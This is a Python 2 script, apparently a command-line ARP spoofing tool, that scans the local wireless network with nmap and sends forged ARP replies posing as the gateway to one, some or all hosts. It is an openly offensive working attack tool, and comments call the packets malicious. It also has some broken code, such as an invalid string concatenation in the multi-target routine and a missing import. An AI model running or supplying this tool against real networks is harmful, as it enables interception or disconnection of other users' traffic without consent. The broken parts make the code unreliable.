import time,os,sys,logging, math,re,netifaces,socket, netaddr,subprocess,struct
from time import sleep
import urllib2 as urllib

notRoot = False
try:
    # check whether user is root
    if os.geteuid() != 0:
        print("\nERROR: ARPspoof must be run with root privileges. Try again with sudo:\n")
        notRoot = True
except:
    pass
if notRoot:
    raise SystemExit


logging.getLogger("Scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except:
    print("\nERROR: Requirements have not been satisfied properly. install required libraries.")
    raise SystemExit

def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
    # Function for sending the malicious ARP packets out with the specified data
    ether = Ether()
    ether.src = my_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac

    arp = arp
    arp.pdst = target_ip
    arp.hwdst = target_mac

    ether = ether
    ether.src = my_mac
    ether.dst = target_mac

    arp.op = 2

    def broadcastPacket():
        packet = ether / arp
        sendp(x=packet, verbose=False)

    broadcastPacket()

def getDefaultInterface():
    #ifaces = netifaces.interfaces()
    myiface = 'wlan0'
    addrs = netifaces.ifaddresses(myiface)
    ipinfo = addrs[socket.AF_INET][0]
    address = ipinfo['addr']
    netmask = ipinfo['netmask']
    cidr = netaddr.IPNetwork('%s/%s' % (address, netmask))
    network = cidr.network
    cidr_gate = netaddr.IPNetwork('%s/%s' % (network, netmask))
    return cidr_gate


def scan(network):
    network= str(network)
    nmap = subprocess.Popen(('nmap','-oX','-', '-sP',network ), stdout=subprocess.PIPE)
    ipout = nmap.communicate()[0]
    ipout=ipout.split("<host>")
    addrs=[]
    for i in ipout:
        k1=re.findall('<address addr="(.*?)" addrtype="ipv4"/>\n<address addr="(.*?)" addrtype="mac"/>',i)
        try:
            k1=list(k1[0])
            addrs.append(k1)
        except:
            pass
    return addrs[::-1]


def scanNetwork():
    global hostsList
    try:
        # call scanning function
        hostsList = scan(getDefaultInterface())
        print hostsList
    except KeyboardInterrupt:
        print('\n\nThanks for dropping by.\nCatch ya later!')
        raise SystemExit
    except:
        print("\nERROR: Network scanning failed. Please check your requirements configuration.\n")
        raise SystemExit
    regenOnlineIPs()

def getGatewayIP():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def getDefaultInterfaceMAC():
    k= netifaces.ifaddresses('wlan0')[netifaces.AF_LINK]
    k=k[0]["addr"]
    return k


def resolveMac(mac):
    try:
        # sen request to macvendors.co
        url = "http://macvendors.co/api/vendorname/"
        request = urllib.Request(url + mac, headers={'User-Agent': "API Browser"})
        response = urllib.urlopen(request)
        vendor = response.read()
        vendor = vendor.decode("utf-8")
        vendor = vendor[:25]
        return vendor
    except:
        return "N/A"

def runDebug():
    print("\n\nWARNING! An unknown error has occurred, starting debug...")
    print("Starting debug... (report this crash ")

    try:
        print("Current defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to print defaultGatewayMac...")
    try:
        print ("Reloading mac getter function...")
        regenOnlineIPs()
        print("Reloaded defaultGatewayMac: " + defaultGatewayMac)
    except:
        print ("Failed to reload mac getter function / to print defaultGatewayMac...")
    try:
        print ("Known gateway IP: " + defaultGatewayIP)
    except:
        print ("Failed to print defaultGatewayIP...")
    try:
        print ("Current hostslist array: ")
        print hostsList
    except:
        print ("Failed to print hostsList array...")
    try:
        print ("Crash trace: ")
        print(traceback.format_exc())
    except:
        print ("Failed to print crash trace...")
    print ("DEBUG FINISHED.\nShutting down...")
    raise SystemExit



def regenOnlineIPs():
    global onlineIPs
    global defaultGatewayMac
    global defaultGatewayMacSet

    if not defaultGatewayMacSet:
        defaultGatewayMac = ""

    onlineIPs = []
    for host in hostsList:
        onlineIPs.append(host[0])
        if not defaultGatewayMacSet:
            if host[0] == defaultGatewayIP:
                defaultGatewayMac = host[1]

    if not defaultGatewayMacSet and defaultGatewayMac == "":
        # request gateway MAC address (after failed detection by scapy)
        print("\n ERROR: Default Gateway MAC Address could not be obtained. Please enter MAC manually.\n")
        header = ("ARPspoof> Enter your gateway's MAC Address (MM:MM:MM:SS:SS:SS): ")
        defaultGatewayMac = raw_input(header)
        defaultGatewayMacSet = True


# display options
def optionBanner():
    print('\nChoose option from menu:\n')
    sleep(0.2)
    print('\t[1] Spoof ONE ')
    sleep(0.2)
    print('\t[2] Spoof SOME')
    sleep(0.2)
    print('\t[3] Spoof ALL')
    sleep(0.2)
    print('\n\t[E]Exit Arp spoof\n')



def spoofone():
    os.system("clear||cls")

    print("\nspoof one selected...\n")
    sys.stdout.write("Hang on...\r")
    sys.stdout.flush()
    scanNetwork()


    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [" + str(i) + "] " + str(onlineIPs[i]) + "\t"+ vendor + " ")

    canBreak = False
    while not canBreak:
        try:
            choice = int(raw_input("\nChoose a target: "))
            one_target_ip = onlineIPs[choice]
            canBreak = True
        except KeyboardInterrupt:
            return
        except:
            print("\nERROR: Please enter a number from the list!")

    # locate MAC of specified device
    one_target_mac = ""
    for host in hostsList:
        if host[0] == one_target_ip:
            one_target_mac = host[1]
    if one_target_mac == "":
        print("\nIP address is not up. Please try again.")
        return

    print("\nTarget: " + one_target_ip)

    print("\nSpoofing started... ")
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            sendPacket(defaultInterfaceMac, defaultGatewayIP, one_target_ip, one_target_mac)
            time.sleep(10)
    except KeyboardInterrupt:
        # re-arp target on KeyboardInterrupt exception
        print("\nRe-arping target...")
        reArp = 1
        while reArp != 10:
            try:
                # broadcast ARP packets with legitimate info to restore connection
                sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
            except KeyboardInterrupt:
                pass
            except:
                runDebug()
            reArp += 1
            time.sleep(0.5)
        print("Re-arped target successfully.")

def spoofsome():
    os.system("clear||cls")

    print("\nspoof SOME selected...\n")
    sys.stdout.write("Hang on...\r")
    sys.stdout.flush()
    scanNetwork()

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print("  [" + str(i) + "] " + str(onlineIPs[i]) + "\t" + vendor)

    canBreak = False
    while not canBreak:
        try:
            choice = raw_input("\nChoose devices to target(comma-separated): ")
            if ',' in choice:
                some_targets = choice.split(",")
                canBreak = True
            else:
                print("\nERROR: Please select more than 1 devices from the list.\n")
        except KeyboardInterrupt:
            return

    some_ipList = ""
    for i in some_targets:
        try:
            some_ipList +=  + "'" +  + onlineIPs[int(i)] +  + "', "
        except KeyboardInterrupt:
            return
        except:
            print("\nERROR: '" + i + "' is not in the list.\n")
            return
    some_ipList = some_ipList[:-2]

    print("\nTargets: " + some_ipList)

    print("\n{0}Spoofing started... ")
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            for i in some_targets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            time.sleep(10)
    except KeyboardInterrupt:
        # re-arp targets on KeyboardInterrupt exception
        print("\nRe-arping targets..")
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for i in some_targets:
                ip = onlineIPs[int(i)]
                for host in hostsList:
                    if host[0] == ip:
                        try:
                            sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                        except KeyboardInterrupt:
                            pass
                        except:
                            runDebug()
            reArp += 1
            time.sleep(0.5)
        print("Re-arped targets successfully.")



# kick all devices
def spoofall():
    os.system("clear||cls")

    print("\nspoof all selected...\n")
    sys.stdout.write("Hang on...\r")
    sys.stdout.flush()
    scanNetwork()

    print("Online IPs: ")
    for i in range(len(onlineIPs)):
        mac = ""
        for host in hostsList:
            if host[0] == onlineIPs[i]:
                mac = host[1]
        vendor = resolveMac(mac)
        print(str("  "+ str(onlineIPs[i]) + "\t" + vendor + ""))

    print("\nSpoofing started... ")
    try:
        # broadcast malicious ARP packets (10p/s)
        reScan = 0
        while True:
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    # dodge gateway (avoid crashing network itself)
                    sendPacket(defaultInterfaceMac, defaultGatewayIP, host[0], host[1])
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n Re-arping targets...")
        reArp = 1
        while reArp != 10:
            # broadcast ARP packets with legitimate info to restore connection
            for host in hostsList:
                if host[0] != defaultGatewayIP:
                    try:
                        # dodge gateway
                        sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
                    except KeyboardInterrupt:
                        pass
                    except:
                        runDebug()
            reArp += 1
            time.sleep(0.5)
        print("Re-arped targets successfully.")




def main():

    # display heading


    print(
        "\nUsing interface '" + str(defaultInterface) + "' with mac address '" + defaultInterfaceMac + "'.\nGateway IP: '"
        + defaultGatewayIP + "' --> " + str(len(hostsList)) + " hosts are up.")
    # display warning in case of no active hosts
    if len(hostsList) == 0 or len(hostsList) == 1:
        if len(hostsList) == 1:
            if hostsList[0][0] == defaultGatewayIP:
                print("\nWARNING: There are 0 hosts up on you network except your gateway.\n\tYou can't spoof anyone off \n")
                raise SystemExit
        else:
            print(
            "\nWARNING: There are 0 hosts up on you network.\n\tIt looks like something went wrong")
            print(
            "\nIf you are experiencing this error multiple times, please report it\n\t")
            raise SystemExit

    try:

        while True:

            optionBanner()

            header = ('arp spoof> ')
            choice = raw_input(header)

            if choice.upper() == 'E' or choice.upper() == 'EXIT':
                print('\n{0}stopped arp spoof.'
                      '\ngood luck!{1}')
                raise SystemExit
            elif choice == '1':
                spoofone()
            elif choice == '2':
                spoofsome()
            elif choice == '3':
                spoofall()
            elif choice.upper() == 'CLEAR':
                os.system("clear||cls")
            else:
                print("\nERROR: Please select a valid option.\n")

    except KeyboardInterrupt:
        print('\n\nstopped arp spoof.'
              '\nsee you soon!')

if __name__ == '__main__':

    # configure appropriate network info
    print("Scanning your network, hang on...\r")
    defaultInterface = getDefaultInterface()
    defaultGatewayIP = getGatewayIP()
    defaultInterfaceMac = getDefaultInterfaceMAC()
    global defaultGatewayMacSet
    defaultGatewayMacSet = False
    # commence scanning process
    scanNetwork()
    main()
